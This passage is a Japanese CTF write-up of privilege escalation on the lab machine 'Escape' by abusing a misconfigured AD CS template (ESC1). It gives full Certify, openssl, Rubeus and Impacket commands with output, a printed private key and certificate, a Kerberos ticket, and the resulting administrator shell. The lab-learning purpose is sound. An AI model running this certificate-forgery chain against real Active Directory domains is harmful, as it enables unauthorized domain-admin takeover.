（Rubeus.exeとかCertify.exeは[Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)にある）

まずは脆弱なテンプレートがあるかをチェックする

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-5
 ```
 
 on behalf of administrator, certificateをリクエストする
 
 ```
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 19

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxClNG8+fUy9hGRgsD+8Pr44VnKfv/9AE0CWEJfWIBIH0S58v
rXvefGtJ1LyevewKWGGUznYpk3+Gt/Eub9N48KzE8n7yks0Rnaia4IK07lY6xus8
qUifwaq/zMfVNaM6JcMQmgppQA6hNiXn7FZMMmeL9cmKo5pvpp9sjvi1khyrxCBt
cUzZP7v+G4k5vGUzlLLQT7uJFptUDtjBU85P2VgTrTY0Zn8PL05z85dB92CSX1bq
AYnLdBFbDpkh/oZJGp4rze7B2YLgBZoIai8Fy04aQEN9oIatKBpd7lbMZ8vKlL46
5+4w52I9BeaG4HhYn/H+4mYKhNFqe6bascaPpQIDAQABAoIBACzX3D7NWfjkTeg0
tG34ErfpXVtwsNbkMRV8XhdnZ+7P3o8jFv0r4hLDXB979zYnrb3CoQgJzzte3edT
BXCfAXjTpjphdwbERpCqKK3Gc6JAqDMtN7LjXVIivLINxNn8NKDJVRRB6QmxznzY
cYp/t++V6FMJ/d2kwn1u2JxekvORn+PvM0GnWqnzjFALJEHP5gDoPrY4pNEnzJAg
0BIn2Lr2WiGdPgsj9Y8Ob1qf6xgtyw3mleoBl3yUVQARJ1VBLWeACFy5fPM5J6DQ
Yr1AMp1+83lVwwVN1va0soyblNBH7J1od81T10foRAIP6oFpur28+0p5bnbsoJrs
1wvyA0kCgYEA4n+vDimlbgqVUbGow499B1g/JxIf7fuLEDW96PqOMbSNnqQxQekR
bVF+c7zyXlaAXqL5bd7F3oy+nAllXf7ZnMtUANfL53stttO1gPe5og30BzTEMJcH
89OLhEi6WQft+VHrh7KcVelvNDMYA1iUZU9YRaBQYnU8mTkKMEmfRMsCgYEA3bYN
zU6DOQRy8jRefdBtsfJSyrk6ObZXWjvG4Bb0Ig9YVJH3dEcOjB09fQjCqOpNIPq0
kHWcxTCqGlyMmFEjLa6lUCoVbZRTikjkTCksOYFiH3q/cKmnzAOsUjnSsfv2Vtwl
Et2ibZquPjK8QUc6guyt7/JGcP/6qj2hytMrX08CgYAyY52aVQGMvaYCire06hMy
sxs5ofqggzmo3YvmbPd9b2GiTXz34NYTr/Gl5f81paDhbPh4zPrQTBeLtztp8eyP
yVxi459lXC4LYoYarwIJX3lOsRqEhNUsFYAQae2rKOx0bxkrEz1cj5ZB0qwg8m/x
KfnFY6j+fn6AyAPQQlDAiQKBgF4QaGirn9boAVCrUU+1x2SQ9/lUftSPfR4mcGkQ
tAFjW0l+KGun3g8qNLVAqz35MkIEu+jyTVIIJJNMosXY3sD58N9DC5ZTMOJhrKJ3
cXDwaM4MSP6mrC9Ne6XjLHYg/VG60uvfJpOz5asz4VUcwEFd4yoDM0msARCLV4Jy
91rXAoGAP/CJah1au83z3o34SMn4LVGHwmqoQHavQSTBi2OVQrdfJ5YzYqHYezFq
6dNadQt97KCiaig3UYRINfvOUKc9Z8auqMqzamufu4n5fw7WlFOd87baH5Qdr3YF
xfFq5DkFLBEyKMxmm07f0SOKVdYzu+ZP22eJZ35Vll6h3dY6nSU=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAABMCZtW+GpDlmwAAAAAAEzANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMzA5MTkxMDQ2WhcNMjUwMzA5
MTkyMDQ2WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDEKU0bz59TL2EZGCwP7w+vjhWc
p+//0ATQJYQl9YgEgfRLny+te958a0nUvJ697ApYYZTOdimTf4a38S5v03jwrMTy
fvKSzRGdqJrggrTuVjrG6zypSJ/Bqr/Mx9U1ozolwxCaCmlADqE2JefsVkwyZ4v1
yYqjmm+mn2yO+LWSHKvEIG1xTNk/u/4biTm8ZTOUstBPu4kWm1QO2MFTzk/ZWBOt
NjRmfw8vTnPzl0H3YJJfVuoBict0EVsOmSH+hkkanivN7sHZguAFmghqLwXLThpA
Q32ghq0oGl3uVsxny8qUvjrn7jDnYj0F5obgeFif8f7iZgqE0Wp7ptqxxo+lAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIFjBZ0VUF4lSYWdY6xEnX0qGCiX
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAdz4H86jBy0OP25GULj9rgUBPio7JRi4bEa0sVT8VKIm7ZhvByTrCX4Ep
wIlG+FmaVrjV+mQWd1qMY95gt/dtH4BGTG02LH+8SXr8HQryn+LpiKBKXjCebZPU
VQDdhGxPuBxQw9McKIJwh2WyD4vdRi7bERlF6stSUZwGrI+dn9XkLwrXRIfmG58Z
r9eZCOmvGaMDqBSRRP3wYsMfUCsituyqTqIbCBQ+ESNtApYbcb1+ANZc/Qd+Xq6W
xRtGYKgrUmsctglMl5vTiEE2DY7o2JTAwr5WGMTY/QbRq8r3R2XksaDraW7zdcxb
4K9TRww037PTGXpArfhi5ibQrUSqxA==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

cert.pemをコピってKaliに持ってくる。そして`.pfx`に変換：

```
╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
╰─$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

cert.pfxを再度Windowsの方に持ってくる

`cert.pfx`というcertificateを使って、RubeusでadministratorのTGTをリクエストする

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::3151:e0f:a1df:26b6%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  3/9/2023 11:24:37 AM
  EndTime                  :  3/9/2023 9:24:37 PM
  RenewTill                :  3/16/2023 12:24:37 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wdfnlRJs7ze6zJYxKbZ+pw==
  ASREP (key)              :  891C23EB2B62161F96314EDF1C501ED0
```

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> klist

Current LogonId is 0:0x34e262

Cached Tickets: (1)

#0>	Client: administrator @ SEQUEL.HTB
	Server: krbtgt/sequel.htb @ SEQUEL.HTB
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0xe10000 -> renewable initial pre_authent name_canonicalize
	Start Time: 3/9/2023 11:24:37 (local)
	End Time:   3/9/2023 21:24:37 (local)
	Renew Time: 3/16/2023 11:24:37 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY
	Kdc Called:
```

あとは、kirbiのbase64をデコードして、ccacheに変換して、ケルベロス認証でadminのシェルをとる：
 
 ```
 ╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
╰─$ sed 's/^      //g' kirbi_b64 | tr -d '\n' | base64 -d > admin.kirbi


╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
╰─$ impacket-ticketConverter admin.kirbi admin.ccache                                          
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
                                                                                                                                                                                               
╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
╰─$ export KRB5CCNAME=admin.ccache                                              
                                                                                                                                                                                               
╭─[shoebill@kali]─[~/Escape_10.10.11.202] 
╰─$ impacket-wmiexec -k -no-pass sequel.htb/administrator@dc.sequel.htb 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
sequel\administrator
```

ECS1のテンプレートの特徴：
- `msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT field` -> このテンプレートに基づいて新しいcertificateをリクエストするユーザは、administratorを含め
他のユーザに対するcertificateをリクエストできる
- `PkiExtendedKeyUsage: Client Authentication` -> このテンプレートに基づいて作られるcertificateは、AD内のコンピュータへのauthenticationに使用することができる
- `Enrollment Rights: NT Authority\Authenticated Users` -> AD内のすべてのユーザは、このテンプレートに基づいて新しいcertificateをリクエストすることが許されている

 
 参考：
 - [From Misconfigured Certificate Template to Domain Admin(Read Team Notes)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)
 - [Misconfigured Certificate Templates - ESC1 (Hack Tricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1)

bloodhound, winpeas, adPEAS等々色々やったが、privescのできそうになく、最終的に上記の方法でprivescした。なお、certipy（certipy-ad）を使ってすべてKali上でやろう
としたがpythonのエラーがでてうまくいかんかった。ちなみに、CVE-2022-26923は、コンピュータの追加ができないような設定だったので通用しなかった。
